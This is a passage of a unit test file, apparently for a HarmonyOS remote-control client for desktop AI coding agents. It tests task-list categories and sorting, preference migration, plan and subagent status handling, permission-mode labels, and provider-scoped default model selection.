      session.updatedAt = '2026-08-17T08:00:00.000Z';

      const original = taskListEntryPresentationState(session, 'running');
      expect(taskListEntryPresentationState(session, 'running')).assertEqual(original);

      session.title = '绘画已经完成';
      const renamed = taskListEntryPresentationState(session, 'running');
      expect(renamed === original).assertEqual(false);

      session.preview = '已完成绘画';
      const previewUpdated = taskListEntryPresentationState(session, 'running');
      expect(previewUpdated === renamed).assertEqual(false);

      const completed = taskListEntryPresentationState(session, 'time');
      expect(completed === previewUpdated).assertEqual(false);
      expect(session.id).assertEqual('session-stable-id');
    });

    it('classifiesTaskListCategoriesWithAutomationPriority', 0, () => {
      const project = new RemoteSession();
      project.title = 'Build Harmony';
      project.workspaceKind = 'project';
      project.workingDir = '/work/cindy-harmony';
      expect(taskListCategory(project)).assertEqual('projects');

      const dialogue = new RemoteSession();
      dialogue.title = 'Quick question';
      dialogue.workspaceKind = 'dialogue';
      dialogue.workingDir = '/tmp/assigned';
      expect(taskListCategory(dialogue)).assertEqual('dialogues');

      const emptyWorkspace = new RemoteSession();
      emptyWorkspace.title = 'No workspace';
      emptyWorkspace.workspaceKind = 'project';
      emptyWorkspace.workingDir = '';
      expect(taskListCategory(emptyWorkspace)).assertEqual('dialogues');

      const scheduler = new RemoteSession();
      scheduler.title = 'Daily check';
      scheduler.source = 'scheduler';
      scheduler.workspaceKind = 'project';
      scheduler.workingDir = '/work/cindy-harmony';
      expect(taskIsAutomation(scheduler)).assertEqual(true);
      expect(taskListCategory(scheduler)).assertEqual('automations');

      const legacySchedule = new RemoteSession();
      legacySchedule.title = '[Schedule] Weekly report';
      legacySchedule.workspaceKind = 'dialogue';
      legacySchedule.workingDir = '';
      expect(taskIsAutomation(legacySchedule)).assertEqual(true);
      expect(taskListCategory(legacySchedule)).assertEqual('automations');

      const archived = new RemoteSession();
      archived.status = 'archived';
      expect(taskVisibleInTaskList(archived, false)).assertEqual(false);
      expect(taskVisibleInTaskList(archived, true)).assertEqual(true);
      archived.status = 'deleted';
      expect(taskVisibleInTaskList(archived, true)).assertEqual(false);
    });

    it('sortsTaskListByRecencyAlphabetAndSourceDefault', 0, () => {
      const alpha = new RemoteSession();
      alpha.id = 'alpha';
      alpha.title = 'alpha 任务';
      alpha.userSendAt = '2026-08-01T10:00:00.000Z';
      const bravo = new RemoteSession();
      bravo.id = 'bravo';
      bravo.title = 'Bravo 任务';
      bravo.userSendAt = '2026-08-01T11:00:00.000Z';

      const recent = [alpha, bravo];
      recent.sort((left: RemoteSession, right: RemoteSession) =>
        compareTaskSessionsForList(left, right, 'recency'));
      expect(recent[0].id).assertEqual('bravo');
      expect(recent[1].id).assertEqual('alpha');

      const alphabetic = [bravo, alpha];
      alphabetic.sort((left: RemoteSession, right: RemoteSession) =>
        compareTaskSessionsForList(left, right, 'alphabetic'));
      expect(alphabetic[0].id).assertEqual('alpha');
      expect(alphabetic[1].id).assertEqual('bravo');
      expect(compareTaskListLabels('alpha', 'Bravo') < 0).assertEqual(true);

      // 默认排序不施加客户端比较，调用方可保留被控端提供的原始稳定顺序。
      expect(compareTaskSessionsForList(bravo, alpha, 'default')).assertEqual(0);
    });

    it('persistsAutomationCategoryAndDropsLegacyFilters', 0, () => {
      const preferences = new TaskListPreferences();
      preferences.activeListTab = 'automations';
      preferences.sortMode = 'alphabetic';
      preferences.projectOrder = 'custom';
      preferences.manualProjectOrder = ['desktop-a:/repo', 'desktop-a:/repo'];
      preferences.searchQuery = '巡检';
      const serialized = serializeTaskListPreferences(preferences);
      const roundTrip = parseTaskListPreferences(serialized);
      expect(roundTrip.activeListTab).assertEqual('automations');
      expect(roundTrip.sortMode).assertEqual('alphabetic');
      expect(roundTrip.projectOrder).assertEqual('custom');
      expect(roundTrip.manualProjectOrder.length).assertEqual(1);
      expect(roundTrip.manualProjectOrder[0]).assertEqual('desktop-a:/repo');
      expect(roundTrip.searchQuery).assertEqual('巡检');

      const invalidSort = parseTaskListPreferences(JSON.stringify({ sortMode: 'unknown' }));
      expect(invalidSort.sortMode).assertEqual('recency');
      expect(serializeTaskListPreferences(new TaskListPreferences()).indexOf('sortMode')).assertEqual(-1);

      const legacy = parseTaskListPreferences(JSON.stringify({
        activeListTab: 'dialogues',
        statusFilter: 'automation',
        projectFilterKeys: ['device:/work/app'],
        agentFilter: 'codex',
        activityFilter: '7d',
      }));
      expect(legacy.activeListTab).assertEqual('automations');
      const migrated = serializeTaskListPreferences(legacy);
      expect(migrated.indexOf('statusFilter')).assertEqual(-1);
      expect(migrated.indexOf('projectFilterKeys')).assertEqual(-1);
      expect(migrated.indexOf('agentFilter')).assertEqual(-1);
      expect(migrated.indexOf('activityFilter')).assertEqual(-1);
    });

    it('rejectsFailedInvokeResultsBeforeMarkingTopicSubscribed', 0, () => {
      const okEnvelope = new Envelope();
      const okPayload: Record<string, Object> = {};
      okPayload['ok'] = true;
      okEnvelope.payload = okPayload;
      assertInvokeSucceeded(okEnvelope);

      const failedEnvelope = new Envelope();
      const failedPayload: Record<string, Object> = {};
      failedPayload['ok'] = false;
      const error: Record<string, Object> = {};
      error['code'] = 'REMOTE_DISABLED';
      error['message'] = 'remote control disabled';
      failedPayload['error'] = error;
      failedEnvelope.payload = failedPayload;
      let rejected = false;
      try {
        assertInvokeSucceeded(failedEnvelope);
      } catch (caught) {
        rejected = caught instanceof DlError
          && caught.code === 'REMOTE_DISABLED'
          && caught.message === 'remote control disabled';
      }
      expect(rejected).assertEqual(true);
    });

    it('onlyAutoRetriesConnectionErrorsThatWereNotSent', 0, () => {
      expect(isSafeUnsentDlError(new DlError('NOT_CONNECTED', 'offline'))).assertEqual(true);
      expect(isSafeUnsentDlError(new DlError('BACKPRESSURE', 'busy'))).assertEqual(true);
      expect(isSafeUnsentDlError(new DlError('NOT_CONNECTED', 'ack lost', true))).assertEqual(false);
      expect(isSafeUnsentDlError(new DlError('INVOKE_TIMEOUT', 'timeout', true))).assertEqual(false);
    });

    it('keepsCancelledCodexPlansAliveAndSealsSuccessfulOnes', 0, () => {
      const step: Record<string, Object> = {};
      step['step'] = '同步鸿蒙';
      step['status'] = 'in_progress';
      const input: Record<string, Object> = {};
      input['plan'] = [step];
      const cancelled = planToolMessage('cancelled-plan', 'update_plan', input, 'plan:turn-cancelled');
      applyCodexPlanSnapshotOnDone(
        [cancelled], [step], 'turn-cancelled', 'completed', 100, true);
      expect(planRowSealed(cancelled)).assertEqual(false);
      expect(planRowTurnFailed(cancelled)).assertEqual(true);

      const successful = planToolMessage('successful-plan', 'update_plan', input, 'plan:turn-success');
      applyCodexPlanSnapshotOnDone(
        [successful], [step], 'turn-success', 'completed', 200, false);
      expect(planRowSealed(successful)).assertEqual(true);
      expect(successful.terminalPlanAtMs).assertEqual(200);
    });

    it('keepsExplicitFailedPlanStampAheadOfLegacyTurnUsageSeal', 0, () => {
      const raw: Record<string, Object> = {};
      raw['role'] = 'tool_use';
      const content: Record<string, Object> = {};
      content['turnCompleted'] = false;
      raw['content'] = content;
      const agentMeta: Record<string, Object> = {};
      const usage: Record<string, Object> = {};
      usage['inputTokens'] = 1;
      agentMeta['turnUsageDetails'] = usage;
      raw['agentMeta'] = agentMeta;
      const parsed = parseMessage(raw);
      expect(parsed.hasTurnCompleted).assertEqual(true);
      expect(parsed.turnCompleted).assertEqual(false);
      expect(planRowTurnFailed(parsed)).assertEqual(true);
    });

    it('stampsOnlyTheCurrentCodexPlanAcrossSteerRows', 0, () => {
      const step: Record<string, Object> = {};
      step['step'] = '继续排查';
      step['status'] = 'in_progress';
      const input: Record<string, Object> = {};
      input['plan'] = [step];
      const oldPlan = planToolMessage('old-plan', 'update_plan', input, 'plan:old');
      const boundary = userBoundary('new-turn');
      const currentPlan = planToolMessage('current-plan', 'update_plan', input, 'plan:current');
      const steer = userBoundary('steer');
      steer.agentMeta['delivery'] = 'steer';
      const messages = [oldPlan, boundary, currentPlan, steer];
      expect(markCodexPlanTurnFailed(messages)).assertEqual(true);
      expect(planRowTurnFailed(currentPlan)).assertEqual(true);
      expect(planRowTurnFailed(oldPlan)).assertEqual(false);
    });

    it('usesTerminalPlanSealsAsHardPlanSessionBoundaries', 0, () => {
      const step: Record<string, Object> = {};
      step['step'] = '未勾完但本轮成功';
      step['status'] = 'pending';
      const input: Record<string, Object> = {};
      input['plan'] = [step];
      const first = planToolMessage('sealed-plan', 'update_plan', input, 'plan:first');
      first.terminalPlanSnapshot = true;
      const second = planToolMessage('next-plan', 'update_plan', input, 'plan:second');
      expect(findTodoPlanInsertions([first, second]).size).assertEqual(2);
    });

    it('distinguishesSubagentLaunchReceiptsFromRealTerminalResults', 0, () => {
      const spawnInput: Record<string, Object> = {};
      spawnInput['name'] = 'reviewer';
      expect(deriveAgentTaskStatus(
        'running', 'collab:spawn', JSON.stringify(spawnInput), 'reviewer')).assertEqual('running');
      expect(deriveAgentTaskStatus(
        'running', 'Agent', '{}', 'Async agent launched successfully.')).assertEqual('running');
      expect(deriveAgentTaskStatus(
        'running', 'collab:spawnAgent', '{}', 'reviewer: active')).assertEqual('running');
      expect(deriveAgentTaskStatus(
        'running', 'collab:spawnAgent', '{}', 'reviewer: completed')).assertEqual('completed');
      expect(deriveAgentTaskStatus(
        'failed', 'collab:spawnAgent', '{}', 'reviewer: completed')).assertEqual('failed');
    });

    it('restoresPersistedSubagentTerminalStatusAcrossHistoryAndPartialRows', 0, () => {
      const raw: Record<string, Object> = {};
      raw['id'] = 'agent-use-1';
      raw['role'] = 'tool_use';
      const content: Record<string, Object> = {};
      content['toolName'] = 'Agent';
      content['toolUseId'] = 'agent-use-1';
      raw['content'] = content;
      const agentMeta: Record<string, Object> = {};
      agentMeta['agentTaskStatus'] = 'failed';
      raw['agentMeta'] = agentMeta;
      const parsed = parseMessage(raw);
      expect(parsed.agentTaskStatus).assertEqual('failed');
      expect(deriveAgentTaskStatus('running', 'Agent', '{}', '', parsed.agentTaskStatus))
        .assertEqual('failed');

      const existing = new RemoteMessage();
      existing.id = 'agent-use-2';
      existing.role = 'tool_use';
      existing.agentTaskStatus = 'completed';
      const latest = new RemoteMessage();
      latest.id = 'agent-use-2';
      latest.role = 'tool_use';
      const mergedMissingStatus = reconcileLatestMessageWindow(
        [existing], [latest], false, null, false);
      expect(mergedMissingStatus.items[0].agentTaskStatus).assertEqual('completed');

      const completeExisting = new RemoteMessage();
      completeExisting.id = 'agent-use-3';
      completeExisting.role = 'tool_use';
      completeExisting.agentMeta['remoteContentTruncated'] = false;
      const truncatedLatest = new RemoteMessage();
      truncatedLatest.id = 'agent-use-3';
      truncatedLatest.role = 'tool_use';
      truncatedLatest.agentMeta['remoteContentTruncated'] = true;
      truncatedLatest.agentTaskStatus = 'stopped';
      const mergedTruncated = reconcileLatestMessageWindow(
        [completeExisting], [truncatedLatest], false, null, false);
      expect(mergedTruncated.items[0].agentTaskStatus).assertEqual('stopped');
    });

    it('keepsSubagentDetailOnTheLatestNestedRenderTree', 0, () => {
      const parent = new RenderSubagentGroupItem();
      parent.type = 'subagent_group';
      parent.key = 'subagent-parent';
      const nested = new RenderSubagentGroupItem();
      nested.type = 'subagent_group';
      nested.key = 'subagent-nested';
      parent.children = [nested];
      const work = new RenderWorkGroupItem();
      work.type = 'work_group';
      work.children = [parent];

      expect(findSubagentGroupByKey([work], 'subagent-nested')?.key ?? '')
        .assertEqual('subagent-nested');
      expect(findSubagentGroupByKey([work], 'subagent-missing')).assertEqual(null);
      expect(subagentStatusLabel('failed')).assertEqual('失败');
      expect(subagentStatusLabel('stopped')).assertEqual('已停止');
      expect(subagentStatusLabel('running')).assertEqual('正在协作');
    });

    it('deduplicatesLegacyDefaultAndAskPermissionModes', 0, () => {
      const rows: Object[] = ['default', 'ask', 'ask', 'plan', 'acceptEdits'];
      const options = parseChoiceOptions(rows, true);
      expect(options.length).assertEqual(2);
      expect(options[0].id).assertEqual('ask');
      expect(options[1].id).assertEqual('acceptEdits');
      expect(selectedPermissionModeLabel(options, 'acceptEdits')).assertEqual('自动接受编辑');
      expect(selectedPermissionModeLabel(options, 'auto')).assertEqual('自动');
      expect(selectedPermissionModeLabel(options, '')).assertEqual('权限模式');
    });

    it('reconcilesEffortWhenSwitchingComposerModels', 0, () => {
      const rawModel: Record<string, Object> = {};
      rawModel['id'] = 'model-a';
      rawModel['efforts'] = ['medium', 'high'];
      rawModel['defaultEffort'] = 'high';
      const model = parseModelOptions([rawModel])[0];
      expect(reconcileModelEffort(model, 'medium')).assertEqual('medium');
      expect(reconcileModelEffort(model, 'low')).assertEqual('high');

      const rawNoEffortModel: Record<string, Object> = {};
      rawNoEffortModel['id'] = 'model-b';
      const noEffortModel = parseModelOptions([rawNoEffortModel])[0];
      expect(reconcileModelEffort(noEffortModel, 'high')).assertEqual('');
    });

    it('resolvesRemoteNewSessionDefaultModelPerAgentAndKeepsProviderIdentity', 0, () => {
      // 远端 v3 标记：只认当前 agent 的标记，按 sortOrder 取第一个，
      // 并保留候选原始 provider 身份（同名模型不得跨 provider 合并）。
      const piModel: Record<string, Object> = {};
      piModel['id'] = 'shared-model';
      piModel['name'] = 'Shared Model';
      piModel['newSessionDefault'] = ['pi'];
      piModel['sortOrder'] = 20;
      const piModels: Record<string, Object> = {};
      piModels['pi'] = [piModel];
      const piProvider: Record<string, Object> = {};
      piProvider['id'] = 'provider-pi';
      piProvider['name'] = 'Pi Provider';
      piProvider['connected'] = true;
      piProvider['agents'] = ['pi'];
      piProvider['models'] = piModels;

      // 同 id、更小 sortOrder，但只标记给 claude-code：不得被 pi 选中。
      const ccModel: Record<string, Object> = {};
      ccModel['id'] = 'shared-model';
      ccModel['name'] = 'Shared Model';
      ccModel['newSessionDefault'] = ['claude-code'];
      ccModel['sortOrder'] = 1;
      const ccModels: Record<string, Object> = {};
      ccModels['pi'] = [ccModel];
      const ccProvider: Record<string, Object> = {};
      ccProvider['id'] = 'provider-cc';
      ccProvider['name'] = 'CC Provider';
      ccProvider['connected'] = true;
      ccProvider['agents'] = ['pi'];
      ccProvider['models'] = ccModels;

      const response: Record<string, Object> = {};
      response['providers'] = [ccProvider, piProvider];
      const options = parseProviderModelOptions(
        response, 'pi', new Map<string, boolean>(), undefined);
      expect(options.length).assertEqual(2);

      const resolved = resolveNewSessionDefaultModel(options, 'pi');
      expect(resolved !== null).assertEqual(true);
      expect(resolved?.id).assertEqual('shared-model');
      // 保留 provider 身份：选中的是标了 pi 的那一行，而不是 sortOrder 更小的 cc 行。
      expect(resolved?.providerId).assertEqual('provider-pi');

      // 没有任何标记时返回 null，由调用方保留当前稳定默认值。
      expect(resolveNewSessionDefaultModel(options, 'codex')).assertEqual(null);
      expect(resolveNewSessionDefaultModel(options, '')).assertEqual(null);
    });

    it('ignoresDisabledAndMalformedNewSessionDefaultMarkers', 0, () => {
      // defaultEnabled=false 的模型不作为默认种子；非法标记整项忽略但不整表失败。
      const disabled: Record<string, Object> = {};
      disabled['id'] = 'disabled-default';
      disabled['newSessionDefault'] = ['pi'];
      disabled['defaultEnabled'] = false;
      const malformed: Record<string, Object> = {};
      malformed['id'] = 'malformed-default';
      malformed['newSessionDefault'] = 'pi';
      const numeric: Record<string, Object> = {};
      numeric['id'] = 'numeric-default';
      numeric['newSessionDefault'] = [7];

      const parsed = parseModelOptions([disabled, malformed, numeric]);
      expect(parsed.length).assertEqual(3);
      expect(resolveNewSessionDefaultModel(parsed, 'pi')).assertEqual(null);

      // 缺省 sortOrder 的已标记模型仍可被选中，并按目录顺序取第一个。
      const first: Record<string, Object> = {};
      first['id'] = 'first-marked';
      first['newSessionDefault'] = ['pi'];
      const second: Record<string, Object> = {};
      second['id'] = 'second-marked';
      second['newSessionDefault'] = ['pi'];
      const marked = parseModelOptions([first, second]);
      expect(resolveNewSessionDefaultModel(marked, 'pi')?.id).assertEqual('first-marked');
    });

    it('parsesSharedComposerModelsForNewAndExistingTasks', 0, () => {
      const fallbackModel: Record<string, Object> = {};
      fallbackModel['id'] = 'gpt-test';
      fallbackModel['displayName'] = 'GPT Test';
      fallbackModel['defaultEffort'] = 'high';
      fallbackModel['supportsFastMode'] = true;
      fallbackModel['efforts'] = ['medium', 'high'];
      const fallback = parseModelOptions([fallbackModel]);
      expect(fallback.length).assertEqual(1);
      expect(fallback[0].label).assertEqual('GPT Test');
      expect(fallback[0].defaultEffort).assertEqual('high');
      expect(fallback[0].supportsFastMode).assertEqual(true);

      const model: Record<string, Object> = {};
      model['id'] = 'gpt-test';
      model['name'] = 'Provider GPT';
      model['defaultEnabled'] = false;
      const models: Record<string, Object> = {};
      models['codex'] = [model];
      const provider: Record<string, Object> = {};
      provider['id'] = 'provider-a';
      provider['name'] = 'Provider A';
      provider['connected'] = true;
      provider['agents'] = ['codex'];
      provider['models'] = models;
      const overrides: Record<string, Object> = {};
      overrides['codex:provider-a:gpt-test'] = false;
      const response: Record<string, Object> = {};
      response['providers'] = [provider];
      response['modelVisibilityOverrides'] = overrides;
      const visibility = parseModelVisibilityOverrides(response);
      expect(parseProviderModelOptions(response, 'codex', visibility, undefined).length).assertEqual(0);
      const selected = parseProviderModelOptions(response, 'codex', visibility,
        { model: 'gpt-test', providerId: 'provider-a' });
      expect(selected.length).assertEqual(1);
      expect(selected[0].providerId).assertEqual('provider-a');
    });

    it('groupsNewAndExistingTaskModelsWithTheSameProviderOrder', 0, () => {
      const first = new ComposerModelOption();
      first.id = 'model-a';
      first.providerId = 'provider-a';
      first.providerName = 'Provider A';
      const second = new ComposerModelOption();
      second.id = 'model-b';
      second.providerId = 'provider-b';
      second.providerName = 'Provider B';
      const third = new ComposerModelOption();
      third.id = 'model-c';
      third.providerId = 'provider-a';
      third.providerName = 'Provider A';

      const groups = groupComposerModelOptions([first, second, third]);
      expect(groups.length).assertEqual(2);
      expect(groups[0].key).assertEqual('provider-a');
      expect(groups[0].name).assertEqual('Provider A');
      expect(groups[0].options.length).assertEqual(2);
      expect(groups[0].options[1].id).assertEqual('model-c');
      expect(groups[1].key).assertEqual('provider-b');
    });

    it('backsOffTaskListAntiEntropyPerDeviceAndResetsAfterSuccess', 0, () => {
      const backoff = new TaskListReconcileBackoff();
      const start = 1_000;
      backoff.report('desktop-a', false, start, 0.5);
      expect(backoff.shouldAttempt('desktop-a', start + TASK_LIST_RECONCILE_INTERVAL_MS - 1))
        .assertEqual(false);
      expect(backoff.shouldAttempt('desktop-b', start)).assertEqual(true);
      expect(backoff.shouldAttempt('desktop-a', start + TASK_LIST_RECONCILE_INTERVAL_MS))
        .assertEqual(true);

      backoff.report('desktop-a', false, start + TASK_LIST_RECONCILE_INTERVAL_MS, 0.5);
      expect(backoff.shouldAttempt('desktop-a', start + TASK_LIST_RECONCILE_INTERVAL_MS * 3 - 1))
        .assertEqual(false);
      backoff.report('desktop-a', true, start + TASK_LIST_RECONCILE_INTERVAL_MS * 3, 0.5);
      expect(backoff.shouldAttempt('desktop-a', start + TASK_LIST_RECONCILE_INTERVAL_MS * 3))
        .assertEqual(true);
    });
  });
}
